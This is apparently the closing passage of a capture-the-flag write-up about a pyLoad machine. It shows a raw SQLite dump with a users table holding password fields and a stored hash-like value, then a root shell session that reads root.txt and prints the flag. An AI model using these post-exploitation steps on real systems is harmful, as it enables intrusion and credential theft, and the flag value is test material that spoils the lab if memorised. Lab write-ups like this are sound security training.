   	a��7viewpstatspstatsCREATE VIEW "pstats" AS         SELECT p.id AS id, SUM(l.size) AS sizetotal, COUNT(l.id) AS linkstotal, linksdone, sizedone        FROM packages p JOIN links l ON p.id = l.package LEFT OUTER JOIN        (SELECT p.id AS id, COUNT(*) AS linksdone, SUM(l.size) AS sizedone         FROM packages p JOIN links l ON p.id = l.package AND l.status in (0,4,13) GROUP BY p.id) s ON s.id = p.id         GROUP BY p.idF!cindexp_id_indexlinksCREATE INDEX "p_id_index" ON links(package)��ableusersusersCREATE TABLE "users" ("id" INTEGER PRIMARY KEY AUTOINCREMENT, "name" TEXT NOT NULL, "email" TEXT DEFAULT "" NOT NULL, "password" TEXT NOT NULL, "role" INTEGER DEFAULT 0 NOT NULL, "permission" INTEGER DEFAULT 0 NOT NULL, "template" TEXT DEFAULT "default" NOT NULL)�$tablestoragestorageCREATE TABLE "storage" ("id" INTEGER PRIMARY KEY AUTOINCREMENT, "identifier" TEXT NOT NULL, "key" TEXT NOT NULL, "value" TEXT DEFAULT "")��etablelinkslinksCREATE TABLE "links" ("id" INTEGER PRIMARY KEY AUTOINCREMENT, "url" TEXT NOT NULL, "name" TEXT, "size" INTEGER DEFAULT 0 NOT NULL, "status" INTEGER DEFAULT 3 NOT NULL, "plugin" TEXT DEFAULT "DefaultPlugin" NOT NULL, "error" TEXT DEFAULT "", "linkorder" INTEGER DEFAULT 0 NOT NULL, "package" INTEGER DEFAULT 0 NOT NULL, FOREIGN KEY(package) REFERENCES packages(id))P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)��]tablepackagespackagesCREATE TABLE "packages" ("id" INTEGER PRIMARY KEY AUTOINCREMENT, "name" TEXT NOT NULL, "folder" TEXT, "password" TEXT DEFAULT "", "site" TEXT DEFAULT "", "queue" INTEGER DEFAULT 0 N���NULL, "packageorder" INTEGER DEFAULT 0 NOT NULL)
}����}xternalScriptsinfodwl/UserAgentSwitcherinfodwl%UnSkipOnFaiyload88f7af49c73496107a6af17ef90ac641be187829409c0c091a41305ba038475c83bfbf4349ef57554524acb1487d382cdefault
root@pc:~/.pyload/data# ccd /root
cd /root
root@pc:~# ls
ls
Downloads
root.txt
snap
sqlite.db.bak
root@pc:~# cat root.txt
cat root.txt
daa3a04a86025c32598359a16099cfc4



```
![[Pasted image 20230725164634.png]]
![[Pasted image 20230725165105.png]]
![[Pasted image 20230725165620.png]]
![[Pasted image 20230725171241.png]]

[[Topology]]